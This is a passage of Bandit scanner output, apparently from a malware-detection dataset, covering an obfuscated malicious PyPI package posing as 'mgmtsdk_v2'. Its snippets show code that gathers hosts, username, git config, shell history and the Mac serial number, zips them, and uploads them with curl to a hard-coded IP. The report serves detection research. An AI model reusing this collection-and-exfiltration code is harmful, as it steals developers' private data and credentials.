23	            self.errors = self.json.get('errors', None)
24	        except:

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:34
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
33	        self.whkIlTpgbEKvIljRIkzvzhGAVICXsTuA = whkIlTpgbEKvIljRIkzvzhGAVICXsTuA
34	        self.verbose = whkIlTpgbEKvIljRIkzvzhGAVICXsTuA.get('verbose', False)
35	        if 'verbose' in whkIlTpgbEKvIljRIkzvzhGAVICXsTuA:

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:37
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
36	            del self.whkIlTpgbEKvIljRIkzvzhGAVICXsTuA['verbose']
37	        self.web_api_prefix = whkIlTpgbEKvIljRIkzvzhGAVICXsTuA.get('api_prefix', None) or sdqHUlBOvTxuFQilkjzpHKViQvMHkvTa
38	        if whkIlTpgbEKvIljRIkzvzhGAVICXsTuA.get('api_prefix', None):

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:38
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
37	        self.web_api_prefix = whkIlTpgbEKvIljRIkzvzhGAVICXsTuA.get('api_prefix', None) or sdqHUlBOvTxuFQilkjzpHKViQvMHkvTa
38	        if whkIlTpgbEKvIljRIkzvzhGAVICXsTuA.get('api_prefix', None):
39	            del self.whkIlTpgbEKvIljRIkzvzhGAVICXsTuA['api_prefix']

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:41
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
40	        if "verify" not in self.whkIlTpgbEKvIljRIkzvzhGAVICXsTuA:
41	            mDQBykIQhIEINBixOGKkYyJnzKNOgEex = os.environ.get('VERIFY_MGMT_SSL', True)
42	            self.whkIlTpgbEKvIljRIkzvzhGAVICXsTuA["verify"] = True if str(mDQBykIQhIEINBixOGKkYyJnzKNOgEex).lower() == 'true' else False

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:48
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
47	        self.session.mount('https://', nxFZezxJzngcsxhanJIKkwmsBYyeYJia)
48	        self.hostname_url = hostname if 'http' in hostname else 'https://{0}'.format(hostname)
49	        self.NaZmneIjeQMddjsnHVEXnDlsceyBKbPp()

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:60
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
59	            DOacVGMqVgIKYVrvgKSvSkdOxlRJUJva = '{}/{}/{}'.format(self.hostname_url, kcSNjuMnXRYRUntyHfxQCwPGMtmbSlTz, endpoint)
60	        sssqLlrnBLGtmZwHIaCVkyixCRTmoGns = self.session.get(DOacVGMqVgIKYVrvgKSvSkdOxlRJUJva, ydhukkWMpqjcvYoIFMgImyWsUfBYOdEi=ydhukkWMpqjcvYoIFMgImyWsUfBYOdEi,
61	                                    CyazzYSoUjXnvzWuYqBiuFgYJILShmkn=self.qtDISAwEXFFjTMAQjEMrfawiubGjxFKI.CyazzYSoUjXnvzWuYqBiuFgYJILShmkn,
62	                                    QTTAJnvyjdOJIXPqCpnyJcTBRVhCpaOB=self.qtDISAwEXFFjTMAQjEMrfawiubGjxFKI.QTTAJnvyjdOJIXPqCpnyJcTBRVhCpaOB,
63	                                    arYKgOiuRkQmhDfsClZRZQTxsgDEalGq=arYKgOiuRkQmhDfsClZRZQTxsgDEalGq,
64	                                    **self.whkIlTpgbEKvIljRIkzvzhGAVICXsTuA)
65	        self.FVlSdIoDhXGQlPWZJjOBADAcPcGbrOAW(sssqLlrnBLGtmZwHIaCVkyixCRTmoGns)

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/client.py:137
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
136	        try:
137	            self.get(endpoint='system/status', kcSNjuMnXRYRUntyHfxQCwPGMtmbSlTz=kcSNjuMnXRYRUntyHfxQCwPGMtmbSlTz)
138	        except Exception as RimwUEYhUMlTBDflNqjTtywLjlCRuHmB:

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:2
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
1	import platform
2	t = platform.system()
3	import platform

--------------------------------------------------
>> Issue: [B308:blacklist] platform.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:2
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b308-platform-system
1	import platform
2	t = platform.system()
3	import platform

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:14
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
13	    with open('/etc/hosts', 'r') as f:
14	        return (f.read())
15	def get_username():

--------------------------------------------------
>> Issue: [B303:blacklist] pwd.getpwuid
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:16
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b303-pwd-getpwuid
15	def get_username():
16	    return pwd.getpwuid(os.getuid())[0]
17	def subprocess_popen(statement):

--------------------------------------------------
>> Issue: [B811:getuid] os.getuid
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:16
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b811_getuid.html
15	def get_username():
16	    return pwd.getpwuid(os.getuid())[0]
17	def subprocess_popen(statement):

--------------------------------------------------
>> Issue: [B305:blacklist] os.getuid
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:16
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes
15	def get_username():
16	    return pwd.getpwuid(os.getuid())[0]
17	def subprocess_popen(statement):

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:30
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
29	def get_gitGlobalConfig():
30	    return subprocess_popen('git config --global --list')
31	def get_bashHistory():

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:37
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
36	        lines = f.readlines()
37	        f.close()
38	        return lines

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:47
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
46	        lines = f.readlines()
47	        f.close()
48	        return lines[-5000:]

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:62
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
61	        for filename in file_names:
62	            z.write(os.path.join(dir_path, filename), f_path + filename)
63	    z.close()

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:63
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
62	            z.write(os.path.join(dir_path, filename), f_path + filename)
63	    z.close()
64	    return file_news

--------------------------------------------------
>> Issue: [B836:rmtree] shutil.rmtree
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:71
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b836_rmtree.html
70	    if os.path.exists(foldername):
71	        shutil.rmtree(foldername)
72	    os.makedirs(foldername)

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:74
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
73	    with open(filename, 'a+') as file:
74	        file.write('hosts : [{}]'.format(get_hosts()) + '\n')
75	        file.write('username : ' + get_username() + '\n')

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:75
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
74	        file.write('hosts : [{}]'.format(get_hosts()) + '\n')
75	        file.write('username : ' + get_username() + '\n')
76	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +'\n')

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:76
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
75	        file.write('username : ' + get_username() + '\n')
76	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +'\n')
77	    bashHistory = '/Users/' + username + '/.bash_history'

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:76
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
75	        file.write('username : ' + get_username() + '\n')
76	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +'\n')
77	    bashHistory = '/Users/' + username + '/.bash_history'

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:83
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
82	    zhHistory = '/Users/' + username + '/.zhHistory'
83	    serialId = str(subprocess_popen("hostname"))
84	    if os.path.exists(bashHistory):

--------------------------------------------------
>> Issue: [B836:rmtree] shutil.rmtree
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:97
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b836_rmtree.html
96	    zip_ya(foldername)
97	    shutil.rmtree(foldername)
98	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:98
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
97	    shutil.rmtree(foldername)
98	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
99	    os.system(command)

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:99
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
98	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
99	    os.system(command)
100	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:99
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
98	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
99	    os.system(command)
100	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2/services/api.py:99
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
98	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
99	    os.system(command)
100	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:2
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
1	import platform
2	t = platform.system()
3	import platform

--------------------------------------------------
>> Issue: [B308:blacklist] platform.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:2
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b308-platform-system
1	import platform
2	t = platform.system()
3	import platform

--------------------------------------------------
>> Issue: [B814:read] os.read
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:14
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b814_read.html
13	    with open('/etc/hosts', 'r') as f:
14	        return (f.read())
15	def get_username():

--------------------------------------------------
>> Issue: [B303:blacklist] pwd.getpwuid
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:16
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b303-pwd-getpwuid
15	def get_username():
16	    return pwd.getpwuid(os.getuid())[0]
17	def subprocess_popen(statement):

--------------------------------------------------
>> Issue: [B811:getuid] os.getuid
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:16
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b811_getuid.html
15	def get_username():
16	    return pwd.getpwuid(os.getuid())[0]
17	def subprocess_popen(statement):

--------------------------------------------------
>> Issue: [B305:blacklist] os.getuid
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:16
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b304-b305-ciphers-and-modes
15	def get_username():
16	    return pwd.getpwuid(os.getuid())[0]
17	def subprocess_popen(statement):

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:30
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
29	def get_gitGlobalConfig():
30	    return subprocess_popen('git config --global --list')
31	def get_bashHistory():

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:37
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
36	        lines = f.readlines()
37	        f.close()
38	        return lines

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:47
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
46	        lines = f.readlines()
47	        f.close()
48	        return lines[-5000:]

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:62
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
61	        for filename in file_names:
62	            z.write(os.path.join(dir_path, filename), f_path + filename)
63	    z.close()

--------------------------------------------------
>> Issue: [B807:close] socket.socket.close
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:63
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b807_close.html
62	            z.write(os.path.join(dir_path, filename), f_path + filename)
63	    z.close()
64	    return file_news

--------------------------------------------------
>> Issue: [B836:rmtree] shutil.rmtree
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:71
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b836_rmtree.html
70	    if os.path.exists(foldername):
71	        shutil.rmtree(foldername)
72	    os.makedirs(foldername)

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:74
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
73	    with open(filename, 'a+') as file:
74	        file.write('hosts : [{}]'.format(get_hosts()) + '\n')
75	        file.write('username : ' + get_username() + '\n')

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:75
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
74	        file.write('hosts : [{}]'.format(get_hosts()) + '\n')
75	        file.write('username : ' + get_username() + '\n')
76	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:76
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
75	        file.write('username : ' + get_username() + '\n')
76	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +
77	                   '\n')
78	    subprocess_popen("ioreg -l | grep IOPlatformSerialNumber >>" + foldername + "/root.txt")

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:76
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
75	        file.write('username : ' + get_username() + '\n')
76	        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +
77	                   '\n')

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:78
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
77	                   '\n')
78	    subprocess_popen("ioreg -l | grep IOPlatformSerialNumber >>" + foldername + "/root.txt")
79	    subprocess_popen("echo ls -la ~/ >>" + foldername + "/root.txt")

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:79
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
78	    subprocess_popen("ioreg -l | grep IOPlatformSerialNumber >>" + foldername + "/root.txt")
79	    subprocess_popen("echo ls -la ~/ >>" + foldername + "/root.txt")
80	    subprocess_popen("ls -la ~/ >>" + foldername + "/root.txt")

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:80
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
79	    subprocess_popen("echo ls -la ~/ >>" + foldername + "/root.txt")
80	    subprocess_popen("ls -la ~/ >>" + foldername + "/root.txt")
81	    subprocess_popen("echo ls -la /Applications >>" + foldername + "/root.txt")

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:81
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
80	    subprocess_popen("ls -la ~/ >>" + foldername + "/root.txt")
81	    subprocess_popen("echo ls -la /Applications >>" + foldername + "/root.txt")
82	    subprocess_popen("ls -la /Applications >>" + foldername + "/root.txt")

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:82
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
81	    subprocess_popen("echo ls -la /Applications >>" + foldername + "/root.txt")
82	    subprocess_popen("ls -la /Applications >>" + foldername + "/root.txt")
83	    bashHistory = '/Users/' + username + '/.bash_history'

--------------------------------------------------
>> Issue: [B813:popen] os.popen
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:89
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b813_popen.html
88	    zhHistory = '/Users/' + username + '/.zhHistory'
89	    serialId = str(subprocess_popen("ioreg -l | grep IOPlatformSerialNumber")).split("\"")[3]
90	    if os.path.exists(bashHistory):

--------------------------------------------------
>> Issue: [B836:rmtree] shutil.rmtree
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:103
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b836_rmtree.html
102	    zip_ya(foldername)
103	    shutil.rmtree(foldername)
104	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:104
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
103	    shutil.rmtree(foldername)
104	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
105	    os.system(command)

--------------------------------------------------
>> Issue: [B812:system] os.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:105
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b812_system.html
104	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
105	    os.system(command)
106	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B817:system] platform.system
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:105
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b817_system.html
104	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
105	    os.system(command)
106	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B316:blacklist] os.system
   Severity: Medium   Confidence: High
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/api.py:105
   More Info: https://bandit.readthedocs.io/en/latest/blacklists/blacklist_calls.html#b313-b320-os-system
104	    command = "curl -k -F \"file=@" + zipname + "\" \"https://54.254.189.27/api/v1/file/upload\" -v" 
105	    os.system(command)
106	    os.remove(zipname)

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/5df454bab7252d3618750825dc00b24c35dff2eb/obfuscated/management/mgmtsdk_v2_1/services/remote_scripts.py:49
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
48	                file = open(file_path, "w")
49	                file.write("#!/bin/bash")
50	                file.close()

--------------------------------------------------

Code scanned:
	Total lines of code: 24486
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 22.0
		High: 100.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 106.0
		High: 16.0
Files skipped (0):
